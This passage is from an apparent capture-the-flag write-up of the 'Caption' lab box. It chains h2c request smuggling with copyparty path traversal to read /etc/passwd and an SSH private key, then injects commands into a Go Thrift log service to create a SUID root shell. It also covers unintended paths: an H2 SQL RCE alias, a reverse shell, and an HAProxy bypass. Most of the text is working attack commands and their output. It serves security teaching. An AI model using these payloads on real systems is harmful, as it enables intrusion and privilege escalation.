        <div id="op_player" class="opview opbox opwide"></div>

        <div id="op_bup" class="opview opbox act">
                <div id="u2err"></div>
                <form method="post" enctype="multipart/form-data" accept-charset="utf-8" action="">
                        <input type="hidden" name="act" value="bput" />
                        <input type="file" name="f" multiple /><br />
                        <input type="submit" value="start upload">
                </form>
                <a id="bbsw" href="?b=u" rel="nofollow"><br />switch to basic browser</a>
        </div>

        <div id="op_mkdir" class="opview opbox act">
                <form method="post" enctype="multipart/form-data" accept-charset="utf-8" action="">
                        <input type="hidden" name="act" value="mkdir" />
                        📂<input type="text" name="name" class="i" placeholder="awesome mix vol.1">
                        <input type="submit" value="make directory">
                </form>
        </div>

        <div id="op_new_md" class="opview opbox">
                <form method="post" enctype="multipart/form-data" accept-charset="utf-8" action="">
                        <input type="hidden" name="act" value="new_md" />
                        📝<input type="text" name="name" class="i" placeholder="weekend-plans">
                        <input type="submit" value="new markdown doc">
                </form>
        </div>

        <div id="op_msg" class="opview opbox act">
                <form method="post" enctype="application/x-www-form-urlencoded" accept-charset="utf-8" action="">
                        📟<input type="text" name="msg" class="i" placeholder="lorem ipsum dolor sit amet">
                        <input type="submit" value="send msg to srv log">
                </form>
        </div>

        <div id="op_unpost" class="opview opbox"></div>

        <div id="op_up2k" class="opview"></div>

        <div id="op_cfg" class="opview opbox opwide"></div>

        <h1 id="path">
                <a href="#" id="entree">🌲</a>
                <a href="/">/</a>
        </h1>

        <div id="tree"></div>

<div id="wrap">
        <div id="bdoc"></div>

        <div id="pro" class="logue"></div>

        <table id="files">
                <thead>
                        <tr>
                                <th name="lead"><span>c</span></th>
                                <th name="href"><span>File Name</span></th>
                                <th name="sz" sort="int"><span>Size</span></th>
                                <th name="ext"><span>T</span></th>
                                <th name="ts"><span>Date</span></th>
                        </tr>
                </thead>
<tbody>
<tr><td>-</td><td><a href="fw_logs">fw_logs</a></td><td>14209</td>
<td>%</td><td>2024-03-06 12:15:18</td></tr>
<tr><td>-</td><td><a href="hadoop_logs">hadoop_logs</a></td><td>16685</td>
<td>%</td><td>2024-03-06 14:40:52</td></tr>
<tr><td>-</td><td><a href="ssh_logs">ssh_logs</a></td><td>15300</td>
<td>%</td><td>2024-03-06 14:38:09</td></tr>
<tr><td>-</td><td><a href="zk_logs">zk_logs</a></td><td>13145</td>
<td>%</td><td>2024-03-06 14:41:03</td></tr>

                </tbody>
        </table>

        <div id="epi" class="logue"></div>

        <h2 id="wfp"><a href="/?h" id="goh">control-panel</a></h2>

        <a href="#" id="repl">π</a>

</div>
        <div id="srv_info"><span>caption</span> // <span>2.01 GiB free of 8.76 GiB</span></div>

        <div id="widget"></div>

        <script>
                var SR = "",
                        TS = "7WOr",
                        acct = "*",
                        perms = ["read"],
                        dgrid = false,
                        themes = 8,
                        dtheme = "az a z",
                        srvinf = "caption</span> // <span>2.01 GiB free of 8.76 GiB",
                        lang = "eng",
                        dfavico = "🎉 000 none",
                        def_hcols = [],
                        have_up2k_idx = false,
                        have_tags_idx = false,
                        have_acode = false,
                        have_mv = true,
                        have_del = true,
                        have_unpost = 43200,
                        have_zip = true,
                        sb_md = "downloads forms popups scripts top-navigation-by-user-activation",
                        sb_lg = "downloads forms popups scripts top-navigation-by-user-activation",
                        lifetime = 0,
                        turbolvl = 0,
                        idxh = 0,
                        frand = false,
                        u2sort = "s",
                        have_emp = false,
                        txt_ext = "txt nfo diz cue readme",
                        logues = ["", ""],
                        readme = "",
                        ls0 = null;

                document.documentElement.className = localStorage.theme || dtheme;
        </script>
        <script src="/.cpr/util.js?_=7WOr"></script>
        <script src="/.cpr/baguettebox.js?_=7WOr"></script>
        <script src="/.cpr/browser.js?_=7WOr"></script>
        <script src="/.cpr/up2k.js?_=7WOr"></script>
</body>

</html>

```

The page title is `<title>💾🎉</title>` . At the bottom of the page, there’s a bunch of scripts in a `.cpr` directory:

```

        <script src="/.cpr/util.js?_=7WOr"></script>
        <script src="/.cpr/baguettebox.js?_=7WOr"></script>
        <script src="/.cpr/browser.js?_=7WOr"></script>
        <script src="/.cpr/up2k.js?_=7WOr"></script>

```

Searching [grep.app](https://grep.app/search?q=%F0%9F%92%BE%F0%9F%8E%89) for the two emoji in the title, I’m able to identify the code:

![image-20240920093210027](/img/image-20240920093210027.png)

It’s [copyparty](https://github.com/9001/copyparty), a “Portable file server”.

### CVE-2023-37474

#### Background

Searching for “copyparty CVE” returns a bunch of results for [CVE-2023-37474](https://nvd.nist.gov/vuln/detail/CVE-2023-37474):

![image-20240920100103807](/img/image-20240920100103807.png)

It’s described as:

> Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory. This issue has been addressed in commit `043e3c7d` which has been included in release 1.8.2. Users are advised to upgrade. There are no known workarounds for this vulnerability.

The [Snyk page for this vuln](https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5777718) has a simple POC:

```

curl -i -s -k -X  GET 'http://172.19.1.2:3923/.cpr/%2Fetc%2Fpasswd'

```

It looks like using `%2f` as `/` will allow me to read files relative to the root of the system. I did a [video analysis](https://www.youtube.com/watch?v=LVDBpON4_IQ) of this exploit:

#### POC

The CVE-2023-37474 POC is just an HTTP request, so I’ll combine that with the smuggling and through the `/download` endpoint, but it doesn’t work:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODQxMTU1fQ.CS3ltv42Q7kPNS1e7Q66b5ox01cM0WzzFzXv45II1SQ'
[INFO] h2c stream established successfully.
...[snip]...
[INFO] Requesting - /download?url=http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 14:04:04 GMT
content-type: text/html; charset=utf-8
content-length: 1898
x-varnish: 3113599
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

<!DOCTYPE html>
<html lang="en">

<head>
        <meta charset="utf-8">
        <title>copyparty</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=0.8">
        <meta name="theme-color" content="#333">

        <link rel="stylesheet" media="screen" href="/.cpr/splash.css?_=7WOr">
        <link rel="stylesheet" media="screen" href="/.cpr/ui.css?_=7WOr">
</head>

<body>
        <div id="wrap">
                <a id="a" href="/?h" class="af">refresh</a>
                <a id="v" href="/?hc" class="af">connect</a>
                        <p id="b">howdy stranger &nbsp; <small>(you're not logged in)</small></p>
                <div id="msg">
                        <h1 id="n">404 not found &nbsp;┐( ´ -`)┌</h1><p><a id="r" href="/?h">go home</a></p>
                </div>

                <h1 id="cc">client config:</h1>
                <ul>

                        <li><a id="i" href="/?k304=y" class="r">enable k304</a> (currently disabled)

                        <blockquote id="j">enabling this will disconnect your client on every HTTP 304, which can prevent some buggy proxies from getting stuck (suddenly not loading pages), <em>but</em> it will also make things slower in general</blockquote></li>

                        <li><a id="k" href="/?reset" class="r" onclick="localStorage.clear();return true">reset client settings</a></li>
                </ul>

                <h1 id="l">login for more:</h1>
                <div>
                        <form method="post" enctype="multipart/form-data" action="/.cpr/etc/passwd">
                                <input type="hidden" name="act" value="login" />
                                <input type="password" name="cppwd" />
                                <input type="submit" value="Login" />

                        </form>
                </div>
        </div>
        <a href="#" id="repl">π</a>
        <span id="pb"><span>powered by</span> <a href="https://github.com/9001/copyparty">copyparty </a></span>
        <script>

var SR = "",
        lang="eng",
        dfavico="🎉 000 none";

document.documentElement.className=localStorage.theme||"az a z";

</script>
<script src="/.cpr/util.js?_=7WOr"></script>
<script src="/.cpr/splash.js?_=7WOr"></script>
</body>
</html>

```

It’s just returning the main copyparty page. Given that it’s going through multiple proxies that may be URL-decoding, I’ll encode the `%` symbols as `%25`, and then it works:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODQxMTU1fQ.CS3ltv42Q7kPNS1e7Q66b5ox01cM0WzzFzXv45II1SQ'
[INFO] h2c stream established successfully.
...[snip]...
[INFO] Requesting - /download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 14:04:52 GMT
content-type: text/html; charset=utf-8
content-length: 2122
x-varnish: 2753246
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
haproxy:x:114:120::/var/lib/haproxy:/usr/sbin/nologin
varnish:x:115:121::/nonexistent:/usr/sbin/nologin
vcache:x:116:121::/nonexistent:/usr/sbin/nologin
varnishlog:x:117:121::/nonexistent:/usr/sbin/nologin
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false

```

### SSH

#### Identify Readable Home Directories

It’d be nice to figure out what user I’m running as. Typically that would be something like www-data, but it’s worth checking if it’s a user from `/etc/passwd`. Typically I check `/proc/self/environ`, but it doesn’t work here (probably due to the content length / file size as explained [here](https://www.youtube.com/watch?v=Cife4ejJGlo)).

I can check for read access in various user home directories by looking for files that I can expect to be there, such as `.profile`. There are two non-root users with shells set in that `passwd` file. If I request `/home/ruth/.profile` it doesn’t return anything related to that file. But if I request `/home/margo/.profile`, it returns the profile:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome/margo/.profile -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxODI3ODQxMTU1fQ.kAGPZg187I4RKV7_Nfq90aP6T2bES92xYLyEOHogibM'
[INFO] h2c stream established successfully.
:status: 200
...[snip]...
[INFO] Requesting - /download?url=http://127.0.0.1:3923/.cpr/%252Fhome/margo/.profile
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Thu, 23 Jan 2025 19:39:58 GMT
content-type: text/html; charset=utf-8
content-length: 807
x-varnish: 121
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi

```

#### Identify SSH Keys

Using this read, I’ll look in the margo user’s home directory for SSH keys. There’s no `id_rsa` file. Above I noted that margo authenticated with an ECDSA key. I can also find that in their `authorized_keys` file:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fauthorized_keys -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODQ1NDg3fQ.bLqft5qj7wDud5l2OPiWHwaVtT9KJmbqUJtEUrCS7hQ'
...[snip]...
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqSg8KG61HKNHTk7s6fVODXXH4ltJK7UVToJcJLFOStiZlwsMgEBbzgQCp9t74S3iWx9uD+/wAnNAhY2VLMatw= margo@caption

```

I’ll check for the private key with the default name for ECDSA:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODQ1NDg3fQ.bLqft5qj7wDud5l2OPiWHwaVtT9KJmbqUJtEUrCS7hQ'
...[snip]...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQTakoPChutRyjR05O7On1Tg11x+JbSSu1FU6CXCSxTk
...[snip]...
zmzx8S9kneFSVQLaW8kdAAAAAAECAwQFBgc=
-----END OPENSSH PRIVATE KEY-----

```

It works.

#### Shell

I’ll save that key to a file and use it to connect as margo:

```

oxdf@hacky$ ssh -i ~/keys/caption-margo margo@caption.htb 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)
...[snip]...
margo@caption:~$

```

And I can grab the first flag:

```

margo@caption:~$ cat user.txt
b4f4508e************************

```

## Shell as root

### Enumeration

#### Margo’s Home Directory

There’s a couple things in margo’s home directory:

```

margo@caption:~$ ls
app  copyparty-sfx.py  gitbucket.war  logs  user.txt

```

`app` is the web application. `copyparty-sfx.py` is the CopyParty script (which is interesting, as it includes a binary file in at the end of the Python script, but not relevant to exploiting the box further). `gitbucket.war` is the running instance of GitBucket. And `logs` contains the logs served by copyparty:

```

margo@caption:~$ ls logs
fw_logs  hadoop_logs  ssh_logs  zk_logs

```

#### Users

There is one other user with a home directory, ruth:

```

margo@caption:/home$ ls
margo  ruth

```

margo cannot access `ruth`. This matches the users with shells set in `passwd`:

```

margo@caption:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash

```

The next step is likely ruth or root.

#### Network

There are a few listening services that I am not able to interact with directly from my VM:

```

margo@caption:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 

```

6081 and 6082 are Varnish (from the config above). 3932 is copyparty.

8000 is the web application running as Python, whereas 80 is the HAProxy instance the routes to 8000 if allowed. 8080 is GitBucket.

9090 is the LogService from [above](#logservice). I’ll use SSH to get a tunnel from 9090 on my host to 9090 on Caption. Trying to load the page in Firefox just hangs and eventually times out. Connecting with `nc` doesn’t do anything.

### Logservice Analysis

The idea behind Thrift is that I can create servers and clients in different languages that will speak a common protocol over the wire. The `log_service.thrift` file defines the functions that will be offered by the server, in this case `ReadLogFile`:

```

    namespace go log_service
     
    service LogService {
        string ReadLogFile(1: string filePath)
    }

```

This says that it takes a single string.

The `server.go` file defines how that is handled in the `ReadLogFile` function. It starts by opening the given file for reading:

```

func (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath string) (r string, err error) {
    file, err := os.Open(filePath)
    if err != nil {
        return "", fmt.Errorf("error opening log file: %v", err)
    }
    defer file.Close()

```

It defines some regex+, and then creates an `output.log` file.

```

    ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
    userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
    outputFile, err := os.Create("output.log")
    if err != nil {
        fmt.Println("Error creating output file:", err)
        return
    }
    defer outputFile.Close()

```

It scans over each line, using the regex to get an IP and user agent string, and then writing those to `output.log`:

```

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := scanner.Text()
        ip := ipRegex.FindString(line)
        userAgentMatch := userAgentRegex.FindStringSubmatch(line)
        var userAgent string
        if len(userAgentMatch) > 1 {
            userAgent = userAgentMatch[1]
        }
        timestamp := time.Now().Format(time.RFC3339)
        logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
        exec.Command{"/bin/sh", "-c", logs}
    }
    return "Log file processed",nil
}

```

It’s using `exec.Command` with `sh` to write to the log file, which is vulnerable to command injection.

### Benign ReadLogFile

#### Setup

I’m going to write a client to interact with this Thrift service. While the server is in Go, I can use whatever I want to interact with it, so I’ll use Python. I’ll start by installing the necessary tools to use Thrift in Python:

```

pip install thrift
sudo apt install thrift-compiler

```

Now I’ll use `thrift` to generate the Python that handles the interaction with the client based on the `.thrift` file:

```

oxdf@hacky$ thrift -r --gen py log_service.thrift
oxdf@hacky$ ls
gen-py  log_service.thrift

```

The `gen-py` directory has these files:

```

oxdf@hacky$ ls gen-py/
client.py  __init__.py  log_service

```

#### Client

I’ll go into the `gen-py` directory and create a `client.py`:

```

import sys
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Import generated Thrift client code

def main():
    transport = TSocket.TSocket('localhost', 9090)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)
    client = LogService.Client(protocol)
    transport.open()

    try:
        log_file_path = sys.argv[1]
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)
    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")
    transport.close()

if __name__ == '__main__':
    main()

```

Most of this code I pulled from ChatGPT. It connects to the service on 9090, uses the generated `LogService` code to call `ReadLogFile`, passing the first argument, and prints the response.

To test this, I’ll run it:

```

oxdf@hacky$ python client.py /tmp/0xdf.log
Thrift exception: Internal error processing ReadLogFile: error opening log file: open /tmp/0xdf.log: no such file or directory

```

That makes sense, as that file doesn’t exist. If I try `/etc/passwd`, it just reports that the file was processed:

```

oxdf@hacky$ python client.py /etc/passwd
Server response: Log file processed

```

### Command Injection

#### Regex Analysis

To get command injection, I need to get the injection into either the `ip` or `userAgent` . `ip` has to be just digits and dots, so not much I can mess with there. But `userAgent` is from this regex:

```

userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)

```

It will take anything that isn’t a double quote that’s between the double quotes. It uses that here:

```

userAgentMatch := userAgentRegex.FindStringSubmatch(line)

```

`FindStringSubmatch` will find not only the match, but also the capture groups (inside `()`), which it then uses this to pull out the group, getting just what is between the “s:

```

var userAgent string
if len(userAgentMatch) > 1 {
    userAgent = userAgentMatch[1]
}

```

#### Create Injection

So I need a file with an IP and the string `"user-agent": "[stuff]"`, where the injection is in `[stuff]`. I’ll create `/tmp/0xdf.log`:

```
10.10.10.10 "user-agent":"test'; ping -c 1 10.10.14.6 #"

```

This will set `userAgent` as `test'; ping -c 1 10.10.14.6 #`, and `ip` as `10.10.10.10`, which will make the full command:

```

echo 'IP Address: 10.10.10.10, User-Agent: test'; ping -c 1 10.10.14.6 #, Timestamp: some timestamp' >> output.log

```

The `echo` happens to nowhere, and then it should ping. I’ll run the client:

```

oxdf@hacky$ python client.py /tmp/0xdf.log
Server response: Log file processed

```

And there’s ICMP:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:17:06.039893 IP 10.10.11.33 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
12:17:06.039901 IP 10.10.14.6 > 10.10.11.33: ICMP echo reply, id 2, seq 1, length 64

```

#### Root Shell

To upgrade this to a shell, I’ll change the log to:

```

margo@caption:/tmp$ cat 0xdf.log 
10.10.10.10 "user-agent":"test'; cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf #"

```

This will create a SetUID/SetGID `bash` instance. I’ll run the client, and it’s there:

```

margo@caption:/tmp$ ls -l 0xdf
-rwsrwsrwx 1 root root 1396520 Sep 20 16:20 0xdf
margo@caption:/tmp$ ./0xdf -p
0xdf-5.1# id
uid=1000(margo) gid=1000(margo) euid=0(root) egid=0(root) groups=0(root),1000(margo)

```

And I can read `root.txt`:

```

0xdf-5.1# cat root.txt
10d7a9c7************************

```

## Beyond Root - Patched Paths

There are two unintended paths that were patched the week after Caption was released:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[GitBucket Access]--<a href="#caption-portal">Creds in\nConfigs</a>-->B(<a href='#authenticated-site'>Authenticated\nSite Access</a>);
    B--<a href="#admin-access">XSS</a>-->C(<a href="#admin-access">Admin Site\nAccess</a>);
    C--<a href="#logs-and-download-enumeration">Smuggling</a>-->D(<a href='#logs-and-download-enumeration'>Backend Site\nAccess</a>);
    D--<a href="#cve-2023-37474">Directory\nTraversal</a>-->E(<a href="#cve-2023-37474">System\nFile Read</a>)
    E--<a href="#ssh">SSH</a>-->F[<a href="#ssh">Shell as\nmargo</a>];
    A--<a href="#foothold-via-gitbucket-db-viewer">H2 DB</a>-->E;
    C--<a href="#haproxy-bypass">HAProxy\nBypass</a>-->D;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,7,8 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Foothold via GitBucket DB Viewer

#### POC

Because I can log into GitBucket with the default admin creds, I have access to `/admin/dbviewer`:

![image-20240920142950483](/img/image-20240920142950483.png)

The backend DB for GitBucket is H2, which has a [page on HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/h2-java-sql-database) that shows RCE. This [Medium post](https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2) from Nairuz Abulhul goes into nice details. Searching around a bit, I found [this script](https://github.com/jas502n/CVE-2019-12384/blob/master/inject.sql):

```

CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('id > exploited.txt')

```

I’ll run the first line in the console:

![image-20240920143420133](/img/image-20240920143420133.png)

It’s created the alias. I’ll run the second line, but rather than writing it to a file, I’ll just execute:

![image-20240920143502276](/img/image-20240920143502276.png)

The result includes the output, though in an error message. Still, it ran.

#### Reverse Shell

From here, I can use a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to get a shell:

![image-20240920143750479](/img/image-20240920143750479.png)

Submitting this just hangs, but at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.33 38494
bash: cannot set terminal process group (1321): Inappropriate ioctl for device
bash: no job control in this shell
margo@caption:~$ 

```

#### SSH

Rather than bothering with a reverse shell, I can go directly to the SSH key:

![image-20240920143934000](/img/image-20240920143934000.png)

There’s three files there. I’ll grab the private key:

![image-20240920144022256](/img/image-20240920144022256.png)

And SSH just like [above](#ssh).

#### File Read Alternative

If RCE isn’t working for some reason, I can also use the `FILE_READ` directive in H2:

![image-20240920144325810](/img/image-20240920144325810.png)

This returns a hex string, which I can decode with `xxd -r -p`:

```

oxdf@hacky$ echo "2d2d2d2d2d424547494e204f50454e5353482050524956415445204b45592d2d2d2d2d0a6233426c626e4e7a614331725a586b74646a45414141414142473576626d554141414145626d39755a5141414141414141414142414141416141414141424e6c5932527a5953317a614745790a4c573570633352774d6a55324141414143473570633352774d6a55324141414151515242314b346839397a65654b4d5044714b426354447a54576b6b7736615869743643646b555a317459460a4c5a48597756306d6470317630484958785069472f376156313466595342657a7554656c59665237564f7775414141416f48646543426c335867675a414141414532566a5a484e684c584e6f0a59544974626d6c7a644841794e54594141414149626d6c7a644841794e545941414142424245485572694833334e35346f77384f6f6f46784d504e4e615354447070654b336f4a3252526e570a316755746b646a4258535a326e572f51636866452b49622f747058586839684946374f354e365668394874553743344141414167486a636c57346c445a5339426c57536e6a4a3955584f375a0a783850714a57472f2f56344b415a4845716f63414141414141514944424155474277673d0a2d2d2d2d2d454e44204f50454e5353482050524956415445204b45592d2d2d2d2d0a" | xxd -r -p
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQRB1K4h99zeeKMPDqKBcTDzTWkkw6aXit6CdkUZ1tYF
LZHYwV0mdp1v0HIXxPiG/7aV14fYSBezuTelYfR7VOwuAAAAoHdeCBl3XggZAAAAE2VjZHNhLXNo
YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEHUriH33N54ow8OooFxMPNNaSTDppeK3oJ2RRnW
1gUtkdjBXSZ2nW/QchfE+Ib/tpXXh9hIF7O5N6Vh9HtU7C4AAAAgHjclW4lDZS9BlWSnjJ9UXO7Z
x8PqJWG//V4KAZHEqocAAAAAAQIDBAUGBwg=
-----END OPENSSH PRIVATE KEY-----

```

### HAProxy Bypass

The rules blocking access to `/logs` and `/download` were originally defined in the HAProxy config as:

```

default_backend http_back
acl restricted_page path_beg,url_dec -i /logs
acl restricted_page path_beg,url_dec -i /download

```

The weird\_proxies [page on HAProxy and Nuster](https://github.com/GrrrDog/weird_proxies/blob/master/Haproxy-and-Nuster.md#vulnerable-configs) shows bypasses for a similar config:

![image-20240920144801831](/img/image-20240920144801831.png)

Caption’s config has `url_dec`, which eliminates the third option, `/%61dmin`, as `%61` is just URL-encoded “a”. The second one won’t work because even if it makes it to `/logs/`, that isn’t the same endpoint as `/logs` to Flask, so it just returns 404.

However, `//logs` does show something different. As margo, it returns an internal server error, the same as I was getting with the smuggling bypass as margo:

![image-20240920145019707](/img/image-20240920145019707.png)

This is a bypass of the HAProxy ACL. As admin, it loads the page:

![image-20240920145153567](/img/image-20240920145153567.png)

### Patches

Both of these issues were patches on 25 September 2024, one week after the release (and after it’s week in the competitive season was complete):

![image-20250123144456753](/img/image-20250123144456753.png)

The change to the HAProxy rules can be seen in a commit on GitBucket:

![image-20250123144532907](/img/image-20250123144532907.png)

It sets a match for anything with more than one `/` in a row, and if that hits, it issues a deny. This breaks the bypass.

The fix for GitBucket was to remove the default creds and make the repos public. Now I can’t get authenticated access to GitBucket, and thus don’t have access to the DB Viewer.